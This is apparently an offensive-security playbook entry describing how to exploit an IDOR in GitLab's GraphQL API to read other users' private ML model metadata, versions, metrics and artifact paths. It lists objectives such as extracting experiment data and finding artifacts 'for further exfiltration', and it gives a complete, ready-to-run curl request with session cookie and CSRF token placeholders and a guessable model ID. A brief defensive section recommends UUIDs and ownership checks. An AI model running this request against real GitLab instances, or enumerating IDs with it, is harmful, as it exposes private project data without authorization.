---
id: proc-gitlab-query-model-idor
tags:
  - idor
  - graphql
  - model-access
  - gitlab
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/gitlab-graphql-get-model]]'
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Data from Information Repositories]]'
updated_at: '2025-12-14T17:25:47.624Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Data from Information Repositories]]'
---
# Query-ML-Model-Details-via-GraphQL-IDOR

## Summary

This procedure exploits IDOR in GitLab's GraphQL API to retrieve unauthorized details of a Machine Learning model by supplying a guessable model ID, exposing private project data without ownership checks.

## Description

GitLab's ML Model Registry uses incremental, predictable IDs (e.g., gid://gitlab/Ml::Model/1000401) in GraphQL queries. Any authenticated user can query any ID via the /api/graphql endpoint, bypassing authorization. This reveals model metadata, versions, candidates, parameters, metrics, and artifact paths. Applicable to all GitLab tiers; discovered via HackerOne report #2528293.

## Requirements

1. Valid GitLab session tokens (Cookie and X-Csrf-Token)
2. Known or guessed model ID (start with observed IDs and increment/decrement)
3. cURL or HTTP client for POST requests
4. Network access to GitLab API

## Defense

Defensive measures and detection strategies:

- Implement ID obfuscation or UUIDs instead of incremental IDs
- Add project ownership checks in GraphQL resolvers for mlModel queries
- Log and alert on GraphQL queries with non-owned IDs

## Objectives

1. Access private ML model details
2. Extract sensitive experiment data and links
3. Identify artifacts for further exfiltration

## Instructions

### Step 1: Prepare GraphQL Query

**Context**: Construct the query payload targeting a specific model ID.

Use the getModel operation with variables.id set to the target (e.g., "gid://gitlab/Ml::Model/1000401").

### Step 2: Execute Query with Tokens

**Context**: Send the authenticated POST request to fetch model data.

**Command** ([[commands/gitlab-graphql-get-model]]):
```bash
curl -X POST 'https://gitlab.com/api/graphql' \
  -H 'Cookie: _gitlab_session=<your-session-cookie>' \
  -H 'X-Csrf-Token: <your-csrf-token>' \
  -H 'Content-Type: application/json' \
  -d '{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query getModel($id: MlModelID!) { mlModel(id: $id) { id description name versionCount candidateCount latestVersion { id version packageId description candidate { id name iid eid status params { nodes { id name value __typename } __typename } metadata { nodes { id name value __typename } __typename } metrics { nodes { id name value step __typename } __typename } ciJob { id webPath name pipeline { id mergeRequest { id iid title webUrl __typename } user { id avatarUrl webUrl username name __typename } __typename } __typename } _links { showPath artifactPath __typename } __typename } _links { showPath __typename } __typename } __typename } }"}'
```

> The response includes JSON with model fields; if unauthorized, data from other projects appears without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Data from Information Repositories]] Data from Information Repositories

### Sub-Techniques


## Commands Used

- [[commands/gitlab-graphql-get-model]]

## Tools Used


## Tags

- idor
- graphql
- model-access
- gitlab
